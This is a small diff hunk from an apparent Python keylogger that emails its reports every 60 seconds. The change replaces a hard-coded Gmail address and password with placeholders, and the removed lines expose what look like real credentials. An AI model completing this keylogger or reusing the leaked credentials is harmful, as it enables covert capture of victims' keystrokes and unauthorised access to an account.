@@ -5,8 +5,8 @@ from threading import Timer #Timer is used to make a method run after an interva
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60 
-EMAIL_ADDRESS = "tiredviper69@gmail.com"
-EMAIL_PASSWORD = "Sampson$1"
+EMAIL_ADDRESS = "email"
+EMAIL_PASSWORD = "password"
 
 class Keylogger:
     
